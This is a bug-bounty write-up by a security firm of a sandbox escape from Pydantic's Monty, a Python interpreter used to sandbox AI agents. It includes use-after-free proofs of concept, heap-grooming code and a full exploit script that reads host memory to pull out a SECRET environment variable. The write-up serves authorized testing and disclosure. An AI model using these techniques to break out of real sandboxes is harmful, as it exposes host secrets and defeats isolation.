---
schema_version: "1.0.0"
document_id: "8ae162e86503bd6ca5ba539995a1e711756006c94b3ce1480b9703e245d80f73"
company_key: "yc-veria-labs"
company: "Veria Labs"
source_id: "yc-veria-labs-rss-80fd8934189a"
canonical_url: "https://verialabs.com/blog/pwning-pydantic-monty/"
published_at: "2026-05-07T00:00:00+00:00"
first_seen_at: "2026-07-20T23:20:58.723115+00:00"
fetched_at: "2026-07-28T22:12:44.576485+00:00"
content_hash: "sha256:200fb4b0bc16b39552881a74d16256bc267ad6b226c9429ca027a2efa9607825"
---

# Pwning Pydantic's Monty: A $5K Sandbox Escape

**Hacking Pydantic's Monty** A $5,000 Sandbox Escape


May 7, 2026


#bug-bounty


On April 20th[Pydantic](https://pydantic.dev/) put up a $5,000[challenge](https://hackmonty.com/) for the first person to escape[Monty](https://github.com/pydantic/monty) , their custom Python interpreter and AI agent sandbox.


It was a pretty special bounty program, in that it was structured like a[CTF challenge](https://www.youtube.com/watch?v=8ev9ZX9J45A) : read the flag in` /app/secret.txt` (or the` SECRET` environment variable). The challenge is black-box, meaning the server-side setup is completely unknown to us. We are only given an API to submit code to be run in the Python sandbox and a public Logfire instance to review our submissions.


Our AI agent discovered the underlying vulnerability and was able to reproduce locally; from there we spent a few hours turning the primitive into a working sandbox escape against the live environment. We were the first to submit a working escape and claim the $5,000 bounty.


We think a skilled operator could have found this manually, or with help from a general-purpose coding assistant like Claude Code, but with a lot more time and effort. As this was a competition, being able to discover the bug quickly gave us a strong advantage.


Pydantic published their own writeup of the vulnerability[here](https://pydantic.dev/articles/hack-monty-postmortem) .


> This exploit was written for Monty version 0.0.16


## The Vulnerability


A classic bug that appears in garbage-collected languages is the proper tracking of live objects. In this case the interpreter defines a few sources of garbage collection “roots”. Each root object is walked to locate any referenced child objects, marking all encountered heap objects as “live”. This sweep is performed recursively until all reachable objects have been searched and marked appropriately. Normally this garbage collection process would be perfectly fine, as long as the proper garbage collection roots are supplied to let the recursive walk mark all live objects.


As you can probably guess, the interpreter had a bug that allowed live objects to be hidden from the garbage collection sweep, resulting in a use-after-free vulnerability. The interpreter has a few garbage collection roots: the current interpreter stack, the globals array, the JSON object cache, and the exception stack. The first bug materializes in how the interpreter handles builtin method calls. When non-builtin functions are called the interpreter collects all the arguments passed to the function and pushes them all onto the interpreter stack, ensuring that the arguments will be picked up by the garbage collection sweep. However builtin functions are handled differently. Before invoking a builtin function the interpreter would first pop all of the arguments from the interpreter stack, meaning that if the only reference to an argument was through the interpreter stack, it would now be marked as “dead” by the garbage collection sweep and freed in future garbage collection cycles.


Here is a minimal PoC:


```text
1   nogc   =   []    2   def     trigger  (item):    3       if   item   ==     0  :    4         for   i   in     range  (  100000  ):    5            nogc.append([  5  ,   5  ,   5  ])    6       print  (item)    7       return     False    8   filter  (trigger, [  0  ,   1  ])
```


Terminal window


```text
python3     run.py     ./poc_builtin_uaf.py    0    5    5
thread     '<unnamed>'   (20392697) panicked at crates/monty/src/heap.rs:945:39:    Heap::dec_ref:     object     already     freed    note:     run     with     `  RUST_BACKTRACE  =  1`     environment     variable     to     display     a     backtrace
```


When this code is run, the sequence printed is 0, 5, 5 instead of the expected 0, 1. Since the garbage collection sweep is blind to arguments passed to builtin functions, the` \[0, 1\]` that is being filtered is freed during the forced garbage collection cycle and replaced with a list of just` \[5, 5, 5\]` .


The second bug is also garbage collection related. Monty supports two methods of heap object access,` HeapId` or` HeapRead` . With a` HeapId` the heap must be queried using the` HeapId` to look up the object on every access. With a` HeapRead` it stashes a pointer to the heap object directly and increments the` readers` reference count for that heap object. Heap objects with a non-zero` readers` count should not be freed since somewhere a` HeapRead` object is still referencing the underlying object. Seems fine right? Except the garbage collection sweep wasn’t actually checking heap object` readers` reference count, it was only relying on object reachability.


Combined, these two bugs allow for a use-after-free of a Rust heap object and subsequent type confusion.


```text
1   nogc   =   []    2   def     trigger  (item):    3         if   item   ==     0  :    4             for   i   in     range  (  100000  ):    5                  nogc.append([  5  ,   5  ,   5  ])    6         return     0    7   [  0  ,   1  ,   2  ].sort(  key  =  trigger)
```


Terminal window


```text
python3     run.py     ./poc_sort_uaf.py
thread     '<unnamed>'   (20386150) panicked at crates/monty/src/heap.rs:949:17:    Heap::dec_ref:     cannot     free     HeapId  (  2  )   with     18446744073709551615     active     reader  (  s  )    note:     run     with     `  RUST_BACKTRACE  =  1`     environment     variable     to     display     a     backtrace
thread     '<unnamed>'   (20386150) panicked at crates/monty/src/heap.rs:949:17:    Heap::dec_ref:     cannot     free     HeapId  (  2  )   with     18446744073709551615     active     reader  (  s  )    stack     backtrace:         0:            0x105ee9a70     -     <unknown>         1:            0x105d5f600     -     <unknown>         2:            0x105ee7db0     -     <unknown>         3:            0x105ee7a00     -     <unknown>         4:            0x105f08788     -     <unknown>         5:            0x105f08744     -     <unknown>         6:            0x105f08c8c     -     <unknown>         7:            0x1063acfb8     -     _PyInit__monty         8:            0x105cab038     -     <unknown>         9:            0x105c9df90     -     <unknown>        10:            0x105d47918     -     <unknown>        11:            0x105d42cec     -     <unknown>        12:            0x105ca2404     -     <unknown>        13:            0x105ca29a8     -     <unknown>        14:            0x10499c7c4     -     _method_vectorcall_FASTCALL_KEYWORDS        15:            0x104990598     -     _PyObject_Vectorcall        16:            0x104ab92e8     -     __PyEval_EvalFrameDefault        17:            0x104ab75a4     -     _PyEval_EvalCode        18:            0x104b27d04     -     _run_eval_code_obj        19:            0x104b2774c     -     _run_mod        20:            0x104b25df4     -     _pyrun_file        21:            0x104b25130     -     __PyRun_SimpleFileObject        22:            0x104b24d68     -     __PyRun_AnyFileObject        23:            0x104b4c9e0     -     _pymain_run_file_obj        24:            0x104b4c68c     -     _pymain_run_file        25:            0x104b4b8fc     -     _Py_RunMain        26:            0x104b4bef8     -     _pymain_main        27:            0x104b4bf98     -     _Py_BytesMain
thread     '<unnamed>'   (20386150) panicked at /rustc/59807616e1fa2540724bfbac14d7976d7e4a3860/library/core/src/panicking.rs:233:5:    panic     in     a     destructor     during     cleanup    thread     caused     non-unwinding     panic.     aborting.    [1]    41133 abort      python3 run.py ./poc_sort_uaf.py
```


## Exploitation Primitives


Now this is where we must leave the warm comfort of our high-level languages and enter the terrifying realm of pointers and native code.


The interpreter heap consists of a` Vec<Page>` , with each` Page` holding 256` Slot` structures, with the` HeapData` enum embedded directly into the` Slot` struct.


```text
1   const     PAGE_SIZE  :     usize     =     256  ;    2   type     Page     =     Box  <[  Slot  ;   PAGE_SIZE  ]>;    3   type     Slot     =     MaybeUninit  <  Option  <  HeapEntry  >>;    4   pub     struct     HeapEntry   {    5          refcount  :     Cell  <  usize  >,    6         /// Number of active `HeapRead` pointers into this entry's data.    7         ///    8         /// Incremented when `HeapReader::read` creates a `HeapRead`, decremented when    9         /// the `HeapRead` is dropped. `dec_ref` panics if it would free an entry that    10         /// still has active readers — this guarantees that `HeapRead` pointers remain    11         /// valid for as long as they exist.    12          #[serde(skip, default)]   // should always be 0 during serde ops    13          readers  :     Cell  <  usize  >,    14         /// The payload data    15          data  :     UnsafeHeapData  ,    16         /// Current hashing status / cached hash value    17          hash_state  :     HashState  ,    18   }
```


When` HeapRead` grabs a raw pointer reference to the heap object it will be a pointer to the` UnsafeHeapData` field of one of these slots.


```text
1   pub     struct     HeapRead  <'  a  ,   T  :     ?  Sized  > {    2       /// pointer to the data field of HeapEntry, past the enum discriminant    3          value  :     NonNull  <  T  >,    4       /// pointer to the readers field of HeapEntry    5          readers  :     NonNull  <  Cell  <  usize  >>,    6          borrow  :     PhantomData  <  fn  (  &  '  a     T  )   ->     &  '  a     T  >,    7   }
```


The primitive that we can build from this is an out-of-bounds heap read/write due to type confusion. The` do_list_sort` function assumes that the` HeapData` referenced by the` &mut HeapRead<'h, List>` is an actual` List` , but since we can replace the list with another object using our use-after-free vulnerability it will interpret the new` HeapData` as if it were a` List` .


This is how the` List` structure is defined:


```text
1   pub  (  crate  )   struct     List   {    2        items  :     Vec  <  Value  >,    3        contains_refs  :     bool  ,    4   }
```


This is how the structure is laid out in memory:


```text
1   /* offset */    2   struct     monty  ::  types  ::  list  ::  List   {    3   /* 0x00 */    items  :     alloc  ::  vec  ::  Vec  <monty  ::  value  ::  Value  , alloc  ::  alloc  ::  Global  > {    4   /* 0x00 */        cap  :     core  ::  num  ::  niche_types  ::  UsizeNoHighBit  ,    5   /* 0x08 */        ptr  :     core  ::  ptr  ::  unique  ::  Unique  <  u8  >,    6   /* 0x10 */        len  :     usize  ,    7            },    8   /* 0x18 */    contains_refs  :     bool  ,    9   /* total size (bytes): 0x20 */    10   }
```


At this point in the exploit we don’t have any heap leaks and the interpreter doesn’t seem to leak any host addresses like normal Python (e.g.` id(x)` ). So we can’t fake a valid pointer field, but we can allocate a new object with the same general structure as a` List` . A prime candidate for this is the` Bytes` structure:


```text
1   pub  (  crate  )   struct     Bytes  (  Vec  <  u8  >);
```


` Bytes` memory layout:


```text
1   /* offset */    2   struct     monty  ::  types  ::  bytes  ::  Bytes   (    3   /* 0x00 */      alloc  ::  vec  ::  Vec  <  u8  , alloc  ::  alloc  ::  Global  > {    4   /* 0x00 */        cap  :     core  ::  num  ::  niche_types  ::  UsizeNoHighBit  ,    5   /* 0x08 */        ptr  :     core  ::  ptr  ::  unique  ::  Unique  <  u8  >,    6   /* 0x10 */        len  :     usize  ,    7                  },    8   /* total size (bytes): 0x20 */    9   )
```


Both structures begin with a` Vec<T>` , however` Bytes` is` Vec<u8>` and` List` is` Vec<Value>` . The size of the` Value` type is 0x10 bytes while the size of the` u8` type is 0x01 bytes. The` do_list_sort` assumes the object is` List -> Vec<Value>` so it will index the vector using a stride of 0x10 instead of the correct stride of 0x01, giving an out-of-bounds access primitive.


This is how the actual list sorting is implemented:


```text
1   pub     fn     apply_permutation  <  T  >(items  :     &mut   [  T  ], indices  :     &mut   [  usize  ]) {    2         for   i   in     0  ..  items  .  len  () {    3             if   indices[i]   ==   i {    4                 continue  ;    5              }    6             let     mut   current   =   i;    7             loop   {    8                 let   target   =   indices[current];    9                  indices[current]   =   current;    10                 if   target   ==   i {    11                     break  ;    12                  }    13                  items  .  swap  (current, target);    14                  current   =   target;    15              }    16          }    17   }
```


` apply_permutation` will selectively move values around based on the` indices` array which we have full control over. Allowing us to selectively swap values in and out of the` Bytes` vector into out-of-bounds memory, yielding an out-of-bounds heap read/write primitive.


Here is a shortened version of the` do_list_sort` function. The` list` argument is freed by our forced garbage collection cycle in the last iteration of computing` compare_values` and then passed into` apply_permutation` at the very end:


```text
1   fn     do_list_sort  <'  h  >(    2          list  :     &mut     HeapRead  <'  h  ,   List  >,    3          args  :     ArgValues  ,    4          vm  :     &mut     VM  <'  h  , '  _  ,   impl     ResourceTracker  >,    5   )   ->     Result  <(),   RunError  > {    6       /* -- snip -- */    7         let   compare_values   =     if     let     Some  (f)   =   key_fn {    8             let   len   =   list  .  get  (vm  .  heap)  .  items  .  len  ();    9             let   keys  :     Vec  <  Value  >   =     Vec  ::  with_capacity  (len);    10             let     mut   keys_guard   =     HeapGuard  ::  new  (keys, vm);    11             let   (keys, vm)   =   keys_guard  .  as_parts_mut  ();    12             for   i   in     0  ..  len {    13                 let   item   =   list  .  get  (vm  .  heap)  .  items[i]  .  clone_with_heap  (vm);    14                 /// !!!    15                 /// custom key function is evaluated here    16                 /// !!!    17                  keys  .  push  (vm  .  evaluate_function  (  "sorted() key argument"  , f,   ArgValues  ::  One  (item))  ?  );    18              }    19              keys_guard  .  into_inner  ()    20          }   else   {    21         /* -- snip -- */    22          };    23         defer_drop!  (compare_values, vm);    24
25         let   len   =   compare_values  .  len  ();    26         let     mut   indices  :     Vec  <  usize  >   =   (  0  ..  len)  .  collect  ();    27
28         sort_indices  (  &mut   indices, compare_values, reverse, vm)  ?  ;    29
30       /// !!!    31       /// performs the actual sorting    32       /// !!!    33         apply_permutation  (  &mut   list  .  get_mut  (vm  .  heap)  .  items,   &mut   indices);    34         Ok  (())    35   }
```


The first thing that must be done is to prevent the program from fatally panicking. When` \[list type\].sort(...)` is called it is invoked through this code path in the interpreter, which will decrement the reference once the object goes out of scope.


```text
1         fn     call_attr  (  &mut     self  , obj  :     Value  , name_id  :     StringId  , args  :     ArgValues  )   ->     Result  <  CallResult  ,   RunError  > {    2             let   this   =     self  ;    3             let   attr   =     EitherStr  ::  Interned  (name_id);    4
5             match   obj {    6                 Value  ::  Ref  (heap_id)   =>   {    7                     defer_drop!  (obj, this);    8                      this  .  heap  .  read  (heap_id)  .  py_call_attr  (heap_id, this,   &  attr, args)    9                  }
```


This assertion is hit if the reference count hits zero which causes the program to panic if an object will be freed through a zero reference count with non-zero readers.


```text
1         pub     fn     dec_ref  (  &mut     self  , id  :     HeapId  ) {    2             let     mut   current_id   =   id;    3             let     mut   work_stack   =     Vec  ::  new  ();    4             loop   {    5                 let   slot   =     self  .  entries  .  get_mut  (current_id  .  index  ());    6                 let   entry   =   slot  .  as_mut  ()  .  expect  (  "Heap::dec_ref: object already freed"  );    7                 if   entry  .  refcount  .  get  () >   1   {    8                      entry  .  refcount  .  update  (  |  r  |   r   -     1  );    9                  }   else   {    10                     assert!  (    11                          entry  .  readers  .  get  ()   ==     0  ,    12                         "Heap::dec_ref: cannot free HeapId({}) with {} active reader(s)"  ,    13                          current_id  .  index  (),    14                          entry  .  readers  .  get  (),    15                      );
```


The program is currently crashing because as shown by the PoCs above, once the object is freed it will immediately be replaced by a new allocated list object with a readers count of zero. The drop method of` HeapRead` indiscriminately decrements the readers field causing the zero readers count to overflow to 18446744073709551615 (0xFFFFFFFFFFFFFFFF), eventually` dec_ref` is invoked once` call_attr` returns and the program panics.


```text
1   impl  <  T  :     ?  Sized  >   Drop     for     HeapRead  <'  _  ,   T  > {    2         fn     drop  (  &mut     self  ) {    3             let   cell   =     unsafe   {   self  .  readers  .  as_ref  () };    4              cell  .  set  (cell  .  get  ()   -     1  );    5          }    6   }
```


The solution to this problem is to use our newly discovered out-of-bounds heap write primitive (). What if we simply arranged the heap such that the` Bytes` vector memory is allocated before the` Bytes` slot page on the heap? Then we are able to edit the` readers` field to be non-zero and avoid a fatal panic.


## Remote OSINT


There is one issue with this, due to the black-box nature of the challenge, we don’t actually know what allocator is used on remote, or the exact version of Monty, or the exact Python 3 version. For the Monty version we can just assume the latest release version` 0.0.16` . For Python I did a bit of snooping around in their public Logfire instance and discovered this string:` 3.14.4 (main, Apr 8 2026, 17:38:23) \[GCC 14.2.0\]` (printed when invoking an interactive Python session). I assumed they had some sort of containerization on the backend so I tested different Dockerfiles to see what container they were using for this challenge. Eventually I found this:


Terminal window


```text
root@a65b7b7f161c:/share#     python3    Python     3.14.4   (main,   Apr      8     2026,     17:38:21  ) [GCC 14.2.0] on linux    Type     "help",     "copyright",     "credits"     or     "license"     for     more     information.
```


A stock` python:3.14.4` container with Docker yields almost the exact same version string off by two seconds.


We still don’t exactly know how their code is running the Monty sandbox on the backend, but now we can set up a local environment that should match the remote environment almost perfectly. It also tells us that the remote allocator is the glibc allocator.


## Heap Feng Shui


Before the interpreter runs any code these are the heap statistics on my local machine:


```text
1   Found 136 valid chunks in tcache    2   Found 0 valid chunks in fastbins    3   Found 1 valid chunks in unsorted bin    4   Found 80 valid chunks in 26 small bins    5   Found 21 valid chunks in 16 large bins
```


The heap is already relatively messy and it might be even worse on remote. In order to get a consistent heap layout we have to drain the heap of larger chunks that the allocator might split up to serve smaller allocations, since we have no control over the relative heap locations of the old chunks.


By spraying byte objects of exact sizes we can fairly consistently drain the heap of the larger chunks:


```text
1   packing   =   []    2   for   i   in     range  (  256     +     180  ):    3          packing.append([  0x  1337     +   i])    4   amount   =     0x  900    5   lowmem   =   []    6   for   i   in     range  (  32  ):    7          packing.append(  b  "B"     *     0x  3f0  )    8          packing.append(  b  "A"     *     0x  3d8  )    9
10   lowmem.append(  b  "Z"     *     0x  420  ); packing.append(  b  "A"     *     0x  3d8  )    11   lowmem.append(  b  "Z"     *     0x  820  ); packing.append(  b  "A"     *     0x  3d8  )
```


After this code is run:


```text
1   Found 130 valid chunks in tcache    2   Found 0 valid chunks in fastbins    3   Found 1 valid chunks in unsorted bin    4   Found 21 valid chunks in 16 small bins    5   Found 1 valid chunks in 1 large bins
```


Once the larger chunks are gone the heap will be forced to use linear memory to serve new allocations. As long as our new allocations are larger than the rest of the freed chunks on the heap linear memory will be used and guarantees consistent relative object offsets.


```text
1   # amount is 0x900    2   packing.append(  b  "N"     *   amount)    3   lowmem.append(  b  "Z"     *   amount)    4   packing.append(  b  "A"     *     0x  3d8  )    5   for   i   in     range  (  100  ):    6          packing.append([  0x  1337     +   i])
```


The 0x910 sized chunk is our` b"Z" * amount` byte object and the 0xc010 sized chunk is the heap` Page` that will contain the victim` List` object. The 0x3e0 sized chunk is there to prevent coalescing of large free chunks.


```text
1   Chunk  (base  =0x  6435aa781e90  , addr  =0x  6435aa781ea0  , size  =0x  910  , flags  =  PREV_INUSE)    2   Chunk  (base  =0x  6435aa7827a0  , addr  =0x  6435aa7827b0  , size  =0x  3e0  , flags  =  PREV_INUSE)    3   Chunk  (base  =0x  6435aa782b80  , addr  =0x  6435aa782b90  , size  =0x  c010  , flags  =  PREV_INUSE)
```


As long as this relative layout of objects is created on the heap we can entirely disregard the state of the rest of the heap.


## Exploitation (The Fun Part)


```text
1   offset   =     0x  3e    2   x   =     0    3   gc   =   []    4   def     keygen  (key):    5         global   x, lowmem    6          state   =   x    7          x   +=     1    8         if   state   ==   amount   -     1  :    9             print  (  "forcing gc"  )    10             for   i   in     range  (  99454  ):    11                  gc.append([])    12              lowmem.clear()    13              gc.append([  b  "A"     *     0x  10  ])    14              x   =     b  "  \x02\0\0\0\0\0\0\0\x01\0\0\0\0\0\0\0\x01\0\0\0\0\0\0\x80\x01\0\0\0\0\0\0\0\x00\0\0\0\0\0\0\0\xff\xff\xff\xff\xff\xff\xff\x0f\x00\0\0\0\0\0\0\0\x01\0\0\0\0\0\0\x80\x01\0\0\0\0\0\0\0\x00\0\0\0\0\0\0\0  "  .ljust(amount,   b  "B"  )    15             print  (  "ok"  )    16         if   state   ==     0  :    17             return     0x  580    18         elif   state   ==     0x  580  :    19             return     0    20         elif   state   ==     1  :    21             return     0x  93  +  offset    22         elif   state   ==     0x  93  +  offset:    23             return     1    24         elif   state   ==     2  :    25             return     0x  94  +  offset    26         elif   state   ==     0x  94  +  offset:    27             return     2    28         elif   state   ==     3  :    29             return     0x  91  +  offset    30         elif   state   ==     0x  91  +  offset:    31             return     3    32         elif   state   ==     4  :    33             return     0x  92  +  offset    34         elif   state   ==     0x  92  +  offset:    35             return     4    36         else  :    37             return   state    38
39   ([  0  ]   *   amount).sort(  key  =  keygen)
```


On the last iteration of the list indices generation we allocate an exact number of lists to trigger a garbage collection cycle, freeing the list object referenced by the sort. The` lowmem` list is cleared right before allocating the final list so the original 0x910 sized` b"Z" * amount` byte object will be garbage collected and replaced with the new` x = ...` bytes object. The heap slot previously used by the victim` List` object is now occupied by the newly created bytes object with the backing memory of the bytes object at a stable relative offset from the heap slot.


```text
1   /* byte object backing memory */    2   Chunk  (base  =0x  6435aa781e90  , addr  =0x  6435aa781ea0  , size  =0x  910  , flags  =  PREV_INUSE)    3   /* padding chunk */    4   Chunk  (base  =0x  6435aa7827a0  , addr  =0x  6435aa7827b0  , size  =0x  3e0  , flags  =  PREV_INUSE)    5   /* byte object slot in this Page */    6   Chunk  (base  =0x  6435aa782b80  , addr  =0x  6435aa782b90  , size  =0x  c010  , flags  =  PREV_INUSE)
```


With this setup exploitation is simple. The first swap overwrite the bytes object reference count to avoid the non-zero readers panic in` dec_ref` . The rest of the swaps create a fake bytes object in the same` Page` as the bytes object. Before this we sprayed list objects into the` packing` array to guarantee that this page is filled with list objects. The fake bytes object has a pointer field of 0 and a length of` (1<<60)-1` . Indexing this fake byte object with a memory address allows reading the memory at that address since the base pointer is 0 and the length covers the entire userland address space. The last step is to acquire a heap leak, which is done by swapping a heap pointer from a random list object in the heap` Page` into the bytes object which can be parsed out later.


Now all that is left is to search for the corrupted list object in the` packing` array by iterating until the corrupted length is found:


```text
1   def     qword  (b, o):    2         return   b[o]   |   (b[o   +     1  ]   <<     8  )   |   (b[o   +     2  ]   <<     16  )   |   (b[o   +     3  ]   <<     24  )   |   (b[o   +     4  ]   <<     32  )   |   (b[o   +     5  ]   <<     40  )   |   (b[o   +     6  ]   <<     48  )   |   (b[o   +     7  ]   <<     56  )    3
4   first   =   qword(x,   0  )    5   print  (  "bad"  , first)    6   if   first   !=     1  :    7         raise     Exception  (  "good"  )    8
9   print  (x[:  32  ])    10   print  (  hex  (qword(x,   16  )))    11
12   fake   =     None    13   for   i   in     range  (  1  ,   101  ):    14          l   =     len  (packing[  -  i])    15         print  (l)    16         if   l   !=     1  :    17              fake   =   packing[  -  i]    18             break    19
20   if   fake   ==     None  :    21         raise     Exception  (  "fake"  )
```


Finally using the heap leak to scan for stack pointers and enumerating the stack for the` SECRET=` environment variable. The program is terminated early with a` raise Exception(...)` to avoid interpreter panics related to the corrupted state of the heap.


```text
1   o   =   qword(x,   0x  20  )    2   print  (  hex  (o))    3   while     True  :    4         if   fake[o   +     5  ]   ==     0x  7f  :    5             break    6          o   +=     8    7
8   leak   =   qword(fake, o)    9   print  (  hex  (leak))    10
11   while     True  :    12         if   fake[leak   -     1  ]   ==     0     and   fake[leak]   ==     0x  53     and   fake[leak   +     1  ]   ==     0x  45     and   fake[leak   +     2  ]   ==     0x  43     and   fake[leak   +     3  ]   ==     0x  52     and   fake[leak   +     4  ]   ==     0x  45     and   fake[leak   +     5  ]   ==     0x  54     and   fake[leak   +     6  ]   ==     0x  3d  :    13             break    14          leak   +=     1    15
16   print  (  hex  (leak))    17   start   =   leak    18
19   while   fake[leak]   !=     0  :    20          leak   +=     1    21
22   raise     Exception  (fake[start:leak].decode())
```


The exploit isn’t perfect by any means. The initial heap setup can be improved, the hardcoded list allocation count to force garbage collection needs to be specifically tuned, and assumptions are made above the initial program state. But it’s good enough to exploit and leak the secret value from their honeypot.


> SECRET=4HIPD4rQ1C2FeF946Um3WUqHKhiB1YzrNpixKs5SeXerwLodBc


## Full Exploit Script


```text
10   lowmem.append(  b  "Z"     *     0x  420  ); packing.append(  b  "A"     *     0x  3d8  )    11   lowmem.append(  b  "Z"     *     0x  820  ); packing.append(  b  "A"     *     0x  3d8  )    12
13   packing.append(  b  "N"     *   amount)    14   lowmem.append(  b  "Z"     *   amount)    15   packing.append(  b  "A"     *     0x  3d8  )    16   for   i   in     range  (  100  ):    17          packing.append([  0x  1337     +   i])    18
19   offset   =     0x  3e    20   x   =     0    21   gc   =   []    22   def     keygen  (key):    23         global   x, lowmem    24          state   =   x    25          x   +=     1    26         if   state   ==   amount   -     1  :    27             print  (  "forcing gc"  )    28             for   i   in     range  (  99454  ):    29                  gc.append([])    30              lowmem.clear()    31              gc.append([  b  "A"     *     0x  10  ])    32              x   =     b  "  \x02\0\0\0\0\0\0\0\x00\0\0\0\0\0\0\0\x01\0\0\0\0\0\0\x80\x01\0\0\0\0\0\0\0\x00\0\0\0\0\0\0\0\xff\xff\xff\xff\xff\xff\xff\x0f\x00\0\0\0\0\0\0\0\x01\0\0\0\0\0\0\x80\x01\0\0\0\0\0\0\0\x00\0\0\0\0\0\0\0  "  .ljust(amount,   b  "B"  )    33             print  (  "ok"  )    34         if   state   ==     0  :    35             return     0x  580    36         elif   state   ==     0x  580  :    37             return     0    38         elif   state   ==     1  :    39             return     0x  93  +  offset    40         elif   state   ==     0x  93  +  offset:    41             return     1    42         elif   state   ==     2  :    43             return     0x  94  +  offset    44         elif   state   ==     0x  94  +  offset:    45             return     2    46         elif   state   ==     3  :    47             return     0x  91  +  offset    48         elif   state   ==     0x  91  +  offset:    49             return     3    50         elif   state   ==     4  :    51             return     0x  92  +  offset    52         elif   state   ==     0x  92  +  offset:    53             return     4    54         else  :    55             return   state    56
57   ([  0  ]   *   amount).sort(  key  =  keygen)    58   print  (  "lmfao"  )    59
60   def     qword  (b, o):    61         return   b[o]   |   (b[o   +     1  ]   <<     8  )   |   (b[o   +     2  ]   <<     16  )   |   (b[o   +     3  ]   <<     24  )   |   (b[o   +     4  ]   <<     32  )   |   (b[o   +     5  ]   <<     40  )   |   (b[o   +     6  ]   <<     48  )   |   (b[o   +     7  ]   <<     56  )    62
63   first   =   qword(x,   0  )    64   print  (  "bad"  , first)    65   if   first   !=     1  :    66         raise     Exception  (  "good"  )    67
68   print  (x[:  32  ])    69   print  (  hex  (qword(x,   16  )))    70
71   fake   =     None    72   for   i   in     range  (  1  ,   101  ):    73          l   =     len  (packing[  -  i])    74         print  (l)    75         if   l   !=     1  :    76              fake   =   packing[  -  i]    77             break    78
79   if   fake   ==     None  :    80         raise     Exception  (  "fake"  )    81
82   o   =   qword(x,   0x  20  )    83   print  (  hex  (o))    84   while     True  :    85         if   fake[o   +     5  ]   ==     0x  7f     and   fake[o   +     4  ]   >=     0x  d0     and   fake[o   +     3  ]   !=     0  :    86             break    87          o   +=     8    88
89   leak   =   qword(fake, o)    90   print  (  hex  (leak))    91
92   while     True  :    93         if   fake[leak   -     1  ]   ==     0     and   fake[leak]   ==     0x  53     and   fake[leak   +     1  ]   ==     0x  45     and   fake[leak   +     2  ]   ==     0x  43     and   fake[leak   +     3  ]   ==     0x  52     and   fake[leak   +     4  ]   ==     0x  45     and   fake[leak   +     5  ]   ==     0x  54     and   fake[leak   +     6  ]   ==     0x  3d  :    94             break    95          leak   +=     1    96
97   print  (  hex  (leak))    98   start   =   leak    99
100   while   fake[leak]   !=     0  :    101          leak   +=     1    102
103   secret   =   fake[start:leak].decode()    104   print  (secret)    105   raise     Exception  (secret)
```


---


*Owen Kwan ([@unvariantwinter](https://x.com/unvariantwinter) ) is an intern at Veria Labs. Veria was founded by members of[.;,;.](https://ctf.gg/) , the #1 US CTF team.*
